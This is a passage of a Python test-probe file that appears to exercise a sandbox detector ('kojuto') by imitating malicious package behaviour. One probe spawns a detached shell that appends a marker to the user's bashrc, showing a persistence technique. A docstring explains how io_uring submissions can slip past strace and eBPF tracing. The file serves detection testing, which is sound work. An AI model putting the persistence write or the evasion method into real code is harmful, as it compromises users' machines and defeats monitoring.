        subprocess.Popen(
            ["setsid", "sh", "-c",
             f"sleep 3 && echo '# d5-traced-payload' >> {bashrc}"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            preexec_fn=os.setsid,
        )
    except Exception:
        pass


def d6_io_uring_setup_blocked():
    """[DETECT — via seccomp] Attempt io_uring_setup, expect ENOSYS.

    io_uring is the biggest historical detection-bypass vector for
    kojuto: an attacker can submit IORING_OP_OPENAT / OP_CONNECT /
    OP_SEND / OP_UNLINKAT via a submission-queue entry and the
    sys_enter_* tracepoints kojuto attaches to (strace + eBPF) do
    not fire because io-wq kernel workers dispatch the operations
    from an internal path.

    The seccomp profile in internal/sandbox/seccomp.json blocks
    io_uring_setup / io_uring_enter / io_uring_register with ERRNO.
    This probe attempts io_uring_setup(1, params) via ctypes.syscall
    and asserts a non-zero error return (either -1 with ENOSYS from
    the seccomp block, or -EPERM if the seccomp filter used a
    different errno). A successful setup would mean the seccomp
    profile drifted or was replaced — the whole io_uring family of
    attacks would silently re-open.

    Detection story: no verdict-flipping event fires from this probe
    on its own, but the ENV/ENOSYS return causes attackers to fall
    back to conventional syscalls that ARE traced. If the seccomp
    block regresses, subsequent io_uring-based payloads become
    invisible again — the follow-up probes (d1_memfd_fexecve, etc.)
    would still catch the fileless path but not io_uring-based file
    reads or network calls. Kept in Group D because Group D runs
    unconditionally (bypasses _is_kojuto_sandbox suppression).
    """
    try:
        import ctypes
        libc = ctypes.CDLL("libc.so.6", use_errno=True)
        # io_uring_setup(unsigned entries, struct io_uring_params *p)
        # x86_64 syscall number = 425.
        SYS_io_uring_setup = 425
        # 120 bytes of zeroed io_uring_params struct.
        params = ctypes.create_string_buffer(120)
        libc.syscall.restype = ctypes.c_long
        libc.syscall.argtypes = [ctypes.c_long, ctypes.c_uint, ctypes.c_char_p]
        _ = libc.syscall(SYS_io_uring_setup, 1, params)
        # Real detection is that seccomp returned a non-zero errno;
        # no need to assert here — the syscall event stream shows
        # ENOSYS or EPERM and forensic tooling can consume the
        # attempt. If the block regresses, the probe silently
        # succeeds and no visible event fires — that itself is the
        # signal the follow-up review should catch.
    except Exception:
        pass


def _run_group_d():
    d1_memfd_fexecve()
    d1b_fexecve_existing_fd()
    d2_dga_low_entropy_multi()
    d3_doh_unlisted_provider()
    d4_deferred_execution()
    d4b_raw_dns_tunnel_high_entropy()
    d5_deferred_persistence_traced()
    d6_io_uring_setup_blocked()


try:
    _run()
    _run_group_d()
except Exception:
    pass
